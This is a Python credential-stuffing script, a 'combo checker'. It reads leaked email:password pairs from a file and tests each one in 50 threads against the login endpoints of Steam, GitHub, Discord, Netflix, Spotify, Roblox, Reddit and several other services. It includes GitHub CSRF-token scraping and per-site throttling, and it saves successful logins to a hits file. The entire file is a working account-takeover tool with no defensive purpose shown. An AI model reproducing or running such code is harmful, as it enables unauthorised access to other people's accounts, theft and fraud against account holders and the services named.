import threading
import concurrent.futures
import requests
import time
import os
from bs4 import BeautifulSoup

# ================= CONFIG =================
COMBO_FILE = "/storage/emulated/0/Download/combos.txt"
HITS_FILE = "/storage/emulated/0/Download/hits.txt"
THREADS = 50
REQUESTS_PER_SECOND = 50
websites = [
    "Plex", "Steam", "GitHub", "Origin", "BattleNet", "Roblox",
    "Discord", "Reddit", "Spotify", "Trello", "Netflix"
]
MAX_RETRIES = 3

# ================= VARIABLES =================
combos = []
hits_count = {site: 0 for site in websites}
bad_count = {site: 0 for site in websites}
checked_count = 0
valid_combos = []
lock = threading.Lock()

# Throttling global per site
last_request_time = {site: 0 for site in websites}
throttle_lock = {site: threading.Lock() for site in websites}

# ================= LOAD COMBOS =================
if not os.path.exists(COMBO_FILE):
    print(f"[ERROR] combos.txt not found")
    exit()

with open(COMBO_FILE, "r") as f:
    combos = [line.strip() for line in f.readlines() if line.strip()]

print(f"[INFO] Loaded {len(combos)} combos")

# ================= THROTTLE =================
def throttle(site):
    with throttle_lock[site]:
        now = time.time()
        min_interval = 1.0 / REQUESTS_PER_SECOND
        elapsed = now - last_request_time[site]
        if elapsed < min_interval:
            time.sleep(min_interval - elapsed)
        last_request_time[site] = time.time()

# ================= SITE LOGIN FUNCTIONS =================
def check_plex(email, password):
    session = requests.Session()
    headers = {
        "X-Plex-Client-Identifier": "ComboChecker",
        "X-Plex-Product": "ComboChecker",
        "X-Plex-Version": "1.0",
        "X-Plex-Device": "PC",
        "X-Plex-Platform": "Python",
        "X-Plex-Platform-Version": "3.10",
        "User-Agent": "PlexChecker/1.0",
        "Accept": "application/json"
    }
    payload = {"user[login]": email, "user[password]": password}
    for _ in range(MAX_RETRIES):
        try:
            throttle("Plex")
            r = session.post(
                "https://plex.tv/users/sign_in.json",
                data=payload,
                headers=headers,
                timeout=15
            )
            data = r.json()
            if isinstance(data.get("user"), dict) and data["user"].get("id"):
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_steam(email, password):
    session = requests.Session()
    for _ in range(MAX_RETRIES):
        try:
            throttle("Steam")
            r = session.post(
                "https://store.steampowered.com/login/dologin/",
                data={"username": email, "password": password},
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15
            )
            data = r.json()
            if data.get("success") == True:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_github(email, password):
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0"}
    for _ in range(MAX_RETRIES):
        try:
            throttle("GitHub")
            r1 = session.get("https://github.com/login", headers=headers, timeout=15)
            if r1.status_code != 200:
                return "Bad"
            soup = BeautifulSoup(r1.text, "html.parser")
            token_input = soup.find("input", {"name":"authenticity_token"})
            if not token_input:
                return "Bad"
            token = token_input['value']
            payload = {
                "login": email,
                "password": password,
                "commit": "Sign in",
                "authenticity_token": token
            }
            r2 = session.post("https://github.com/session", headers=headers, data=payload, timeout=15, allow_redirects=False)
            if r2.status_code in [302, 301] and 'user_session' in session.cookies.get_dict():
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_origin(email, password):
    session = requests.Session()
    for _ in range(MAX_RETRIES):
        try:
            throttle("Origin")
            r = session.post(
                "https://www.ea.com/fc/api/login",
                json={"email": email, "password": password},
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15
            )
            if r.status_code == 200 and "sessionId" in r.text:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_battlenet(email, password):
    session = requests.Session()
    for _ in range(MAX_RETRIES):
        try:
            throttle("BattleNet")
            r = session.post(
                "https://us.battle.net/login/en/login.json",
                data={"username": email, "password": password},
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15
            )
            data = r.json()
            if data.get("success"):
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_roblox(email, password):
    session = requests.Session()
    for _ in range(MAX_RETRIES):
        try:
            throttle("Roblox")
            r = session.post(
                "https://auth.roblox.com/v2/login",
                json={"c": email, "password": password},
                headers={"User-Agent": "ComboChecker/1.0"},
                timeout=15
            )
            data = r.json()
            if "user" in data:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_discord(email, password):
    session = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    payload = {"login": email, "password": password}
    for _ in range(MAX_RETRIES):
        try:
            throttle("Discord")
            r = session.post("https://discord.com/api/v9/auth/login", json=payload, headers=headers, timeout=15)
            data = r.json()
            if "token" in data:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_reddit(email, password):
    session = requests.Session()
    headers = {"User-Agent": "ComboChecker/1.0"}
    payload = {"user": email, "passwd": password, "api_type": "json"}
    for _ in range(MAX_RETRIES):
        try:
            throttle("Reddit")
            r = session.post(f"https://www.reddit.com/api/login/{email}", data=payload, headers=headers, timeout=15)
            data = r.json()
            if data.get("json", {}).get("errors") == []:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_spotify(email, password):
    session = requests.Session()
    payload = {"username": email, "password": password, "remember": True}
    headers = {"User-Agent": "ComboChecker/1.0"}
    for _ in range(MAX_RETRIES):
        try:
            throttle("Spotify")
            r = session.post("https://accounts.spotify.com/api/login", data=payload, headers=headers, timeout=15)
            data = r.json()
            if data.get("error") is None:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

def check_trello(email, password):
    session = requests.Session()
    payload = {"user": email, "password": password}
    headers = {"User-Agent": "ComboChecker/1.0"}
    for _ in range(MAX_RETRIES):
        try:
            throttle("Trello")
            r = session.post("https://trello.com/login", data=payload, headers=headers, timeout=15, allow_redirects=True)
            # Success if URL is not login page
            if r.url and "/login" not in r.url:
                return "Hit"
            return "Bad"
        except:
            time.sleep(0.1)
    return "Bad"

# ================= NETFLIX CHECKER =================
def check_netflix(email, password):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Referer": "https://www.netflix.com/login"
    }
    
    # First get the authentication page to get cookies
    for _ in range(MAX_RETRIES):
        try:
            throttle("Netflix")
            # Get the login page to set cookies
            session.get("https://www.netflix.com/login", headers=headers, timeout=15)
            
            # Netflix uses a POST request to their API for authentication
            auth_url = "https://www.netflix.com/api/login"
            payload = {
                "userLoginId": email,
                "password": password,
                "rememberMe": "true",
                "flow": "websiteSignUp",
                "mode": "login",
                "action": "loginAction",
                "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode"
            }
            
            r = session.post(auth_url, json=payload, headers=headers, timeout=15)
            
            # Check if login was successful
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success" or "authURL" in data:
                    return "Hit"
            
            return "Bad"
        except Exception as e:
            time.sleep(0.1)
    return "Bad"

# ================= SITE REQUESTS =================
def check_site_requests(combo, site):
    try:
        email, password = combo.split(":", 1)
        if site == "Plex": return check_plex(email, password)
        if site == "Steam": return check_steam(email, password)
        if site == "GitHub": return check_github(email, password)
        if site == "Origin": return check_origin(email, password)
        if site == "BattleNet": return check_battlenet(email, password)
        if site == "Roblox": return check_roblox(email, password)
        if site == "Discord": return check_discord(email, password)
        if site == "Reddit": return check_reddit(email, password)
        if site == "Spotify": return check_spotify(email, password)
        if site == "Trello": return check_trello(email, password)
        if site == "Netflix": return check_netflix(email, password)
    except:
        return "Bad"

# ================= CHECK COMBO =================
def check_combo(combo):
    global checked_count
    result_per_site = {}
    hit_any = False
    for site in websites:
        status = check_site_requests(combo, site)
        result_per_site[site] = status
        with lock:
            if status == "Hit":
                hits_count[site] += 1
                hit_any = True
            else:
                bad_count[site] += 1
    with lock:
        checked_count += 1
        if hit_any:
            valid_combos.append(combo)
        if checked_count % 5 == 0:
            print_status(combo, result_per_site)

# ================= PRINT STATUS =================
def print_status(current_combo="", results=None):
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=== REAL COMBO CHECKER (FULL) ===\n")
    print(f"Checking: {current_combo}\n")
    if results:
        for site, status in results.items():
            print(f"[{status}] {site}")
    print(f"\nChecked: {checked_count} | Hits: {len(valid_combos)} | Threads: {THREADS}\n")
    for site in websites:
        print(f"[v]{site} -> Hit:{hits_count[site]}, Bad:{bad_count[site]}")
    print("\n")

# ================= START =================
start_time = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
    list(executor.map(check_combo, combos))

with open(HITS_FILE, "w") as f:
    for combo in valid_combos:
        f.write(combo + "\n")

end_time = time.time()
print(f"Completed in {end_time - start_time:.2f}s | Hits: {len(valid_combos)} | Total Combos: {len(combos)}")